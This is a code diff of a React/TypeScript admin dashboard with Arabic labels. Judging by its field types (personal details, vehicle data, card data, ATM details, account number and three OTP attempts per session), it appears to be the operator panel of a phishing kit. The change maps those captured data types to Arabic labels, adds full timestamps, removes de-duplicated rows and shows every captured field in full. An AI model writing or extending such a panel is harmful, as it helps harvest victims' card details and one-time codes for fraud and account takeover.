@@ -53,6 +53,34 @@ function formatAgo(iso: string) {
   return `${Math.floor(mins / 60)}س`;
 }
 
+function formatDateTime(iso: string) {
+  const date = new Date(iso);
+  return date.toLocaleString("ar-SA", {
+    year: "numeric",
+    month: "short",
+    day: "numeric",
+    hour: "2-digit",
+    minute: "2-digit",
+    second: "2-digit",
+  });
+}
+
+function getTypeArabic(type: string): string {
+  const typeMap: Record<string, string> = {
+    "initial": "البيانات الشخصية",
+    "vehicle": "بيانات المركبة",
+    "payment": "الدفع",
+    "card": "بيانات البطاقة",
+    "atm": "صراف ATM",
+    "nomer": "رقم الحساب",
+    "nomer_otp": "OTP رقم الحساب",
+    "otp_attempt_1": "رمز التحقق (محاولة 1)",
+    "otp_attempt_2": "رمز التحقق (محاولة 2)",
+    "otp_attempt_3": "رمز التحقق (محاولة 3)",
+  };
+  return typeMap[type] || type.toUpperCase();
+}
+
 function StatCard({ label, value, icon, color, onClick }: { label: string; value: number; icon: ReactNode; color: string; onClick?: () => void }) {
   return (
     <button
@@ -501,31 +529,48 @@ function SessionBox({
           </button>
           
           {historyExpanded && (
-            <div className="px-4 pb-3 space-y-2 max-h-64 overflow-y-auto">
+            <div className="px-4 pb-3 space-y-2 max-h-96 overflow-y-auto">
               {rows.map((row, index) => {
                 const data = parseData(row.data);
+                const prevRow = index < rows.length - 1 ? rows[index + 1] : null;
+                const prevData = prevRow ? parseData(prevRow.data) : null;
+                
+                // De-duplication: skip if data is identical to previous row
+                const isDuplicate = prevData && JSON.stringify(data) === JSON.stringify(prevData);
+                if (isDuplicate) return null;
+                
                 const isLatest = index === 0;
+                
                 return (
                   <div
                     key={row.id}
-                    className={`rounded-xl p-2 text-[10px] ${
+                    className={`rounded-xl p-3 text-[11px] ${
                       isLatest 
                         ? "bg-blue-50 border border-blue-200" 
                         : "bg-slate-50 border border-slate-200"
                     }`}
                   >
-                    <div className="flex items-center justify-between mb-1">
-                      <span className={`font-semibold ${isLatest ? "text-blue-700" : "text-slate-600"}`}>
-                        #{row.id} - {row.type.toUpperCase()}
-                        {isLatest && <span className="mr-1 text-[8px] bg-blue-200 text-blue-800 px-1 rounded">الأحدث</span>}
-                      </span>
-                      <span className="text-slate-400" dir="ltr">{formatAgo(row.createdAt)}</span>
+                    {/* Header */}
+                    <div className="flex items-center justify-between mb-2 pb-2 border-b border-slate-200">
+                      <div className="flex items-center gap-2">
+                        <span className={`font-bold ${isLatest ? "text-blue-700" : "text-slate-700"}`}>
+                          {getTypeArabic(row.type)}
+                        </span>
+                        {isLatest && <span className="text-[9px] bg-blue-200 text-blue-800 px-1.5 py-0.5 rounded font-semibold">الأحدث</span>}
+                      </div>
+                      <div className="flex items-center gap-2 text-slate-400">
+                        <span className="font-mono text-[10px]" dir="ltr">{formatDateTime(row.createdAt)}</span>
+                        <span className="text-[9px]">•</span>
+                        <span className="text-[9px]">#{row.id}</span>
+                      </div>
                     </div>
-                    <div className="grid grid-cols-2 gap-1 text-[9px]">
-                      {Object.entries(data).slice(0, 4).map(([key, value]) => (
-                        <div key={key} className="flex gap-1">
-                          <span className="text-slate-500">{key}:</span>
-                          <span className="font-mono text-slate-700 truncate">{String(value ?? "").substring(0, 20)}</span>
+                    
+                    {/* Full Data - No Truncation */}
+                    <div className="space-y-1.5">
+                      {Object.entries(data).map(([key, value]) => (
+                        <div key={key} className="flex items-start gap-2 py-1 border-b border-slate-100 last:border-0">
+                          <span className="text-slate-500 min-w-[100px] font-semibold">{key}:</span>
+                          <span className="font-mono text-slate-800 break-all flex-1">{String(value ?? "")}</span>
                         </div>
                       ))}
                     </div>
